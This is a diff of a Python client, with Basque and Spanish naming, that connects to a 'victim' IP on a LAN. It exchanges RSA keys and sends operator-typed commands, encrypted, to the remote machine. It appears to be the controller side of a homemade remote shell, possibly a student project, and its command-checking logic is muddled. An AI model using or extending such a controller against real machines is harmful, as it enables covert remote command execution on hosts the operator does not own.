@@ -9,7 +9,7 @@ from fitxategiak.asimetric import asime
 
 
 
-class cliente(object):
+class bezeroa(object):
     def __init__(self,ip_biktima,portua):
         self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
@@ -35,7 +35,6 @@ class cliente(object):
         filBT = None
         with open('pUcliente.pem', "rb") as key_file:
            filBT = key_file.read()
-        print(filBT)
         self.so.send(filBT)
     
     def getPuKey(self):
@@ -46,18 +45,25 @@ class cliente(object):
     
     def keysLoad(self):
         self.GPG.loadPublic("pUserver.pem")
-        os.chdir("..\\prybate")
+        os.chdir("../prybate")
         self.GPG.loadPrymari("prybate.pem")
-        print(self.GPG.private_key)
 
     def comandLIne(self):
         recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
-        decrip = self.GPG.decrypt(recibido)
-        print(decrip)
-        url = str(recibido,encoding='utf-8')#ruta aktuala string modura pasako du
+        recibidoDEc = self.GPG.decrypt(recibido)
+        print(recibidoDEc)
+        url = str(recibidoDEc,encoding='utf-8')#ruta aktuala string modura pasako du
         mezua  = input(url + ">")
-        self.so.send(bytes(mezua,encoding = 'utf-8'))
-        
+        mezuaENc = self.GPG.encrypted(bytes(mezua,encoding='utf-8'))
+        self.so.send(mezuaENc)
+        return mezua
+    
+    def comand_Error(self):
+        erro = self.so.recv(1024)
+        erroDEc = self.GPG.decrypt(erro)
+        erro = str(erroDEc,encoding='utf-8')
+        print(erro)
+
     def koneksioa(self):
         while True:
             recibido = self.so.recv(4095)# ruta aktuala jasokodu (4095) bytes
@@ -106,13 +112,27 @@ class cliente(object):
 
 
 
-cliente = cliente("192.168.0.14",9999)
-cliente.postPuKey()
-cliente.getPuKey()
-cliente.keysLoad()
+bezeroa = bezeroa("192.168.0.16",9999)
+bezeroa.postPuKey()
+bezeroa.getPuKey()
+bezeroa.keysLoad()
 
 while True:
-    cliente.comandLIne()
-
+   comand = bezeroa.comandLIne()
+   Com_ALL = ["dir","systeminfo"]
+   try:
+        inf = Com_ALL.index(comand)
+        windows_Com = ["dir","systeminfo"]
+        Balue = None
+        y = 0
+        for x in windows_Com :
+            print(x)
+            if x == windows_Com[y] and Balue == None:
+                Balue = "windowsComand" 
+                print(Balue)                                     
+        print(Balue)
+   except(ValueError):
+        print("ValueError")
+        bezeroa.comand_Error() 
 
 
